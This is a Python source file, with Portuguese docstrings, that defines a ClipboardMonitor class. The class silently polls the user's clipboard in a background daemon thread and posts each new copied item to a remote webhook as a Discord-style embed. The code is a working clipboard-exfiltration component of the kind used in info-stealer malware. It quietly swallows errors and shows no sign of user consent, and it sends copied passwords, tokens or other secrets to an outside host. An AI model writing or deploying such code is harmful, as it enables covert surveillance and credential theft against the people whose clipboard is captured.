import threading
import time
import pyperclip
import requests
from datetime import datetime

class ClipboardMonitor:
    def __init__(self, interval=10, webhook=None):
        self.interval = interval  
        self.webhook = webhook
        self.previous_clipboard = ""
        self.running = False
        self.thread = None
    
    def monitor(self):
        """Monitora a área de transferência em busca de alterações"""
        while self.running:
            try:
               
                current_clipboard = pyperclip.paste()
                
               
                if current_clipboard != self.previous_clipboard and current_clipboard.strip():
                    
                    self.previous_clipboard = current_clipboard
                    
                   
                    if self.webhook:
                        try:
                            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            
                            payload = {
                                "embeds": [{
                                    "title": "📋 Clipboard Content Changed",
                                    "description": f"**Time:** {now}\n\n```{current_clipboard[:2000]}```",
                                    "color": 15105570
                                }]
                            }
                            
                            requests.post(self.webhook, json=payload)
                        except Exception as e:
                            print(f"Error sending to webhook: {e}")
            except:
                pass  
                
           
            time.sleep(self.interval)
    
    def start(self):
        """Inicia o monitoramento da área de transferência"""
        if self.running:
            return
            
        self.running = True
    
       
        try:
            self.previous_clipboard = pyperclip.paste()
        except:
            self.previous_clipboard = ""
        
        
        self.thread = threading.Thread(target=self.monitor)
        self.thread.daemon = True
        self.thread.start()
    
    def stop(self):
        """Para o monitoramento da área de transferência"""
        self.running = False
        
        
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=self.interval + 1)
    
    def is_running(self):
        """Verifica se o monitoramento está em execução"""
        return self.running